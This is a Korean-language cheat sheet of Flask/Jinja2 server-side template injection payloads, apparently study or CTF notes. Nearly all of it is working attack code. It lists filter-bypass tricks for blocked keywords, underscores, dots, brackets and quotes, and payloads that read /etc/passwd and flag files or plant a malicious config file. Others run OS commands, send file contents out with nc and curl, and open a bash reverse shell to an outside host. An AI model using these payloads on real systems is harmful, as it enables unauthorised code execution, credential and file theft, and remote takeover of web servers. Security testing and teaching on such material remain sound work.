## 1.3. Cheat Sheet

<br>

### 1.3.1. Base Objects

Flask Jinja2 Template 에서 사용할 수 있는 몇 가지 base object 가 존재한다.

Base Objects 를 사용하려면 해당 객체에 대해 미리 정의가 되어있어야 한다.

```python
# Ex)
rv.globals.update(
		url_for=url_for,
		get_flashed_messages=get_flashed_messages,
		config=self.config,
		# request, session and g are normally added with the
		# context processor for efficiency reasons but for imported
		# templates we also want the proxies in there.
		request=request,
		session=session,
		g=g,
)
```

이를 이용한 SSTI Payload 작성은 다음과 같은 형태로 가능하다. 

```python
# Usages
{{**OBJECT**.__class__.mro().__subclasses__()}} 
{{**OBJECT**.__class__.__mro__[1].__subclasses__()}} 
{{**OBJECT**.__class__.__base__.__subclasses__()}}
```

사용할 수 있는 여러가지 Base Object 가 존재한다. 

- Base Objects List ...
    - g
    - request
    - get_flashed_messages
    - url_for
    - config
        
        ```python
        {{ config.items() }}
        {{ config['secret_key'] }}
        ```
        
    - application
    - self
    - cycler
        
        ```python
        {{ cycler.__init__.__globals__.os.popen('id').read() }}
        ```
        
    - joiner
        
        ```python
        {{ joiner.__init__.__globals__.os.popen('id').read() }}
        ```
        
    - namespace
        
        ```python
        {{ namespace.__init__.__globals__.os.popen('id').read() }}
        ```

<br>


### 1.3.2. Filtering Keyword `config` Bypass

```python
# config가 필터링 되는 경우
{{ self.__dict__ }}
{{ self['__dict__']}}
{{ self|attr("__dict__") }}
{{ self|attr("con"+"fig")}}
{{ self.__getitem__('con'+'fig') }}
{{ request.__dict__ }}
{{ request['__dict__']}}
{{ request.__getitem__('con'+'fig') }}
```
<br>


### 1.3.3. Filtering `_` `.` `[` `]` Bypass

![Untitled](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9d5354f0-d4d2-4688-b7e5-8eab8b53d936%2FUntitled.png?table=block&id=1bcd9623-943d-4c09-8c1e-637a847a0f00&spaceId=854b2107-17f9-46f2-9bce-a98a19e3c5cd&width=2000&userId=92264373-62f5-4251-bc57-7ef27ae63364&cache=v2)

```python
# Basic Example
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}

# "_" Filtering: "|attr()" & "\x5f"   or   "['']" & "\x5f"
# "_" == "\x5f"
# \x5f, \137, \u005F, \U0000005F, request.args.get('under') 등 사용
=> {{""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fmro\x5f\x5f")[1]|attr("\x5f\x5fsubclasses\x5f\x5f")()}}
=> {{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__

# "." Filtering: "|attr()"   or   "['']"
=> {{""|attr("__class__")|attr("__mro__")[1]|attr("__subclasses__")()}}

# "[", "]" Filtering: "__getitem__()"   or   "pop()"
=> {{"".__class__.__mro__.__getitem__(1).__subclasses__()}}
=> {{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()}}
=> {{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()}}
```

<br>

### 1.3.4. Filtering Bypass Using Flask `request` module

만약 특정 키워드를 막지만 request 객체 사용을 막지 않는 경우 `request.args`, `request.cookies`, `request.headers`, `request.form`를 이용하여 키워드를 쉽게 우회할 수 있는 방법이 있다.

```python
# Using Request Get Parameter
http://127.0.0.1:8080/?ssti={{ request|attr(request.args.get('class')|attr(request.args.get('mro'))|attr(request.args.get('getitem'))(1) }}&class=__class__&mro=__mro__&getitem=__getitem__
http://127.0.0.1:8080?ssti={{ request|attr(request.form.get('class'))|attr(request.form.get('mro'))|attr(request.form.get('getitem'))(1) }}
http://127.0.0.1:8080?ssti={{ request|attr(request.cookies.get('class'))|attr(request.cookies.get('mro'))|attr(request.cookies.get('getitem'))(1) }}
http://127.0.0.1:8080?ssti={{ request|attr(request.headers.get('class'))|attr(request.headers.get('mro'))|attr(request.headers.get('getitem'))(1) }}
```



<br>

### 1.3.5. Filtering Specific Keyword Bypass

만약 class, mro, subclasses, base 등 특정 키워드가 필터링 되는 경우에는 Jinja2 템플릿 엔진에 내장 함수로 들어있는 attr 함수를 사용하거나 [] 대괄호를 이용하여 문자열로 메서드를 호출할 수 있다.

```python
# class, mro, subclass 등 문자열 필터링 시 다음과 같이 문자열 더하기로 나타내면 우회가 가능하다.
{{ ''['__cl'+'ass__']['__m'+'ro__'][0]['__subcla'+'sses__']() }}
{{ ''|attr('__cl'+'ass__')|attr('__m'+'ro__')[0]|attr('__subcla'+'ssess__')() }}
{{ ''['_'*2+'class'+'_'*2]['_'*2+'mro'+'_'*2][0]['_'*2+'subclasses'+'_'*2]() }}
{{ ''|attr('_'+'_'+'c'+'l'+'a'+'s'+'s'+'_'+'_')|attr('_'+'_'+'m'+'r'+'o'+'_'+'_')[1]|attr('_'+'_'+'s'+'u'+'b'+'c'+'l'+'a'+'s'+'s'+'e'+'s'+'_'+'_')() }}

# 문자열 필터링과 "+" 문자까지 필터링하고 있는 경우 다음과 같이 우회가 가능하다.
{{ ''['__cl''ass__']['__m''ro__'][0]['__subcla''sses__']() }}

# Python Builtins 필터인 |join을 이용하여 우회가 가능하다.
# {{['Thi','s wi','ll b','e appended']|join}} == {{ 'This will be appended' }}
{{ ''|attr(["__","class","__"]|join)|attr(["__","mro","__"]|join)[0]|attr(["__subcla","sses__"]|join)()}}

# |format 이용
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_

# base64 인코딩을 이용한 우회
{{ ().__class__.__bases__[0].__subclasses__()[40]('r','ZmxhZy50eHQ='.decode('base64')).read() }}

# [::-1] 을 이용한 문자열 역순 우회
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}
{{ ().__class__.__base__.__subclasses__()[103].__init__.__globals__['__builtins__']['lave'[::-1]]("__import__('os').system('whoami')") }}

# ascii hex
{{ ''['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f'] }}
# ascii otc
{{ ''['\137\137\143\154\141\163\163\137\137'] }}
# 16bit unicode
{{ ''['\u005F\u005F\u0063\u006c\u0061\u0073\u0073\u005F\u005F'] }}
# 32bit unicode
{{ ''['\U0000005F\U0000005F\U00000063\U0000006c\U00000061\U00000073\U00000073\U0000005F\U0000005F'] }}

# quotation mark(", ')를 필터링 하고있는 경우
# 1. CHR function
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}
# 2. Request object
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd
# 3. Command execution
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&cmd=id
```

<br>

### 1.3.6. Filtering `{{`, `}}` Bypass

Jinja2 Template Engine 구문 중 하나인 `{% %}` 를 이용한다. (Blind SSTI)

```python
{% if(config.__class__.__init__.__globals__['os'].popen('ls | nc 127.0.0.1 8080')) %}{% endif %}
{% for i in range(0,500) %} {% if(((''.__class__.__mro__[1].__subclasses__()[i])|string) == "<class 'subprocess.Popen'>") %} {% if(''.__class__.__mro__[1].__subclasses__()[i]('ls | nc 127.0.0.1 8080', shell=True, stdout=-1)) %} {% endif %} {% endif %} {% endfor %}

{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /etc/passwd | nc HOSTNAME 1337')['read']() == 'chiv' %} a {% endif %}
# HackerPC: $ nc -lvnp 1337
# Output: root:x:0:0:root:/root:/bin/bash ... (cat /etc/passwd Output)

# CURL 을 이용한 출력값 획득 방법
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}

# 
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}         //Popen's parameters are the command to be executed
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

<br>

### 1.3.7. Read/Write Remote File

```python
# [40]: <type File>    # File Class

# read file
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# read file using config class
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}

# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}


# write file & excute malicious code in .cfg

### evil config
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = 
check_output\n') }}

### load the evil config

{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

### connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```
<br>


### 1.3.8. Remote Code Execution

```python
# [109] : <class 'codecs.IncrementalDecoder'>
{{"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os'].popen('ls').read()}}

# [273] : <class 'subprocess.Popen'>
{{"".__class__.__base__.__subclasses__()[273]('ls',shell=True,stdout=-1).communicate()[0].strip()}}

{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}

# attr & . 혼용하는 방법
{{ (config|attr("__class__")).__init__.__globals__['os'].popen('cat flag').read() }}

# flask request 모듈을 이용한 RCE 1 (os.popen)
{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}

# flask request 모듈을 이용한 RCE 2 (os.system())
{{ request.application.__globals__.__builtins__.__import__['os'].system('ls | nc 127.0.0.1 8080') }}

{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}

{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

{{ get_flashed_messages.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}

{{ url_for.__globals__.__builtins__.eval('__import__("os").popen("ls").read()') }}

# [68], [73]: <class 'site._Printer'>, <class 'site.Quitter'>
{{ ().__class__.__bases__[0].__subclasses__()[68].__init__.__globals__['os'].system('whoami') }}
{{ ().__class__.__base__.__subclasses__()[73].__init__.__globals__['os'].system('whoami') }}
{{ ().__class__.__mro__[1].__subclasses__()[68].__init__.__globals__['os'].system('whoami') }}
{{ ().__class__.__mro__[1].__subclasses__()[73].__init__.__globals__['os'].system('whoami') }}

# [140]: <class 'warnings.catch_warnings'>
{{ ().__class__.__base__.__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('ls')") }}
```